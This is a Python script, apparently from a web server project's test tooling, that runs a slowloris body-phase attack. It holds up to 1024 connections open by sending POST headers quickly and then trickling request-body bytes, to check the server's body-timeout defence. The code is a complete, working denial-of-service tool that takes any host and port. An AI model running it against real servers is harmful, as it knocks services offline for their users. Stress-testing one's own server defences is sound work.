"""Slowloris body-phase attack.

Completes the request headers (with Content-Length) fast enough to
get past ``BB_HEADER_TIMEOUT``, then dribbles request-body bytes
one at a time to test ``BB_BODY_TIMEOUT`` (default 30 s).

Exercises the body-phase slowloris defence path in
[recipient.py](../../../blackbull/server/recipient.py) — each
chunk read is bounded by ``body_timeout``.

Usage:
    python3 slowloris_body.py \\
        --host localhost --port 8080 \\
        --connections 1024 --byte-interval 5.0 --duration 60
"""
from __future__ import annotations

import argparse
import asyncio
import contextlib
import time


# A POST /upload with Content-Length: 8192 — the server will accept
# this many body bytes.  We send the headers fast, then dribble
# body bytes one at a time.
def _build_headers(body_size: int) -> bytes:
    return (
        b'POST /upload HTTP/1.1\r\n'
        b'Host: localhost\r\n'
        b'User-Agent: slowloris-body-probe/1\r\n'
        b'Accept: */*\r\n'
        b'Content-Type: application/octet-stream\r\n'
        b'Content-Length: ' + str(body_size).encode() + b'\r\n'
        b'\r\n'
    )


async def _one_connection(host: str, port: int, byte_interval: float,
                          deadline_at: float, body_size: int) -> None:
    while time.monotonic() < deadline_at:
        try:
            reader, writer = await asyncio.open_connection(host, port)
        except OSError:
            await asyncio.sleep(0.1)
            continue
        try:
            # Send headers fast.
            writer.write(_build_headers(body_size))
            try:
                await writer.drain()
            except (ConnectionResetError, BrokenPipeError, OSError):
                continue

            # Now dribble body bytes one at a time.
            for i in range(body_size):
                if time.monotonic() >= deadline_at:
                    break
                try:
                    writer.write(b'\x00')
                    await writer.drain()
                except (ConnectionResetError, BrokenPipeError, OSError):
                    break  # server closed on us (body timeout fired)
                await asyncio.sleep(byte_interval)
        finally:
            with contextlib.suppress(Exception):
                writer.close()
                await writer.wait_closed()


async def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument('--host', default='localhost')
    parser.add_argument('--port', type=int, default=8080)
    parser.add_argument('--connections', type=int, default=1024)
    parser.add_argument('--byte-interval', type=float, default=5.0,
                        help='seconds between body bytes (default 5 — well '
                             'outside BB_BODY_TIMEOUT=30 if it fires per-chunk)')
    parser.add_argument('--body-size', type=int, default=8192,
                        help='Content-Length to announce (the server will '
                             'expect this many bytes; we never reach the end)')
    parser.add_argument('--duration', type=float, default=60.0)
    args = parser.parse_args()

    deadline_at = time.monotonic() + args.duration

    print(f'>>> opening {args.connections} slowloris-body attackers to '
          f'{args.host}:{args.port}, duration {args.duration}s')
    print(f'>>> body bytes drift: {args.byte_interval}s/byte, '
          f'Content-Length: {args.body_size}')

    tasks = [
        asyncio.create_task(
            _one_connection(args.host, args.port, args.byte_interval,
                            deadline_at, args.body_size)
        )
        for _ in range(args.connections)
    ]
    started = time.monotonic()
    try:
        await asyncio.gather(*tasks, return_exceptions=True)
    except asyncio.CancelledError:
        pass
    print(f'>>> attack ended at t+{time.monotonic() - started:.1f}s')


if __name__ == '__main__':
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        if soft < 8192:
            resource.setrlimit(resource.RLIMIT_NOFILE, (min(hard, 8192), hard))
    except (ImportError, ValueError, OSError):
        pass
    asyncio.run(main())
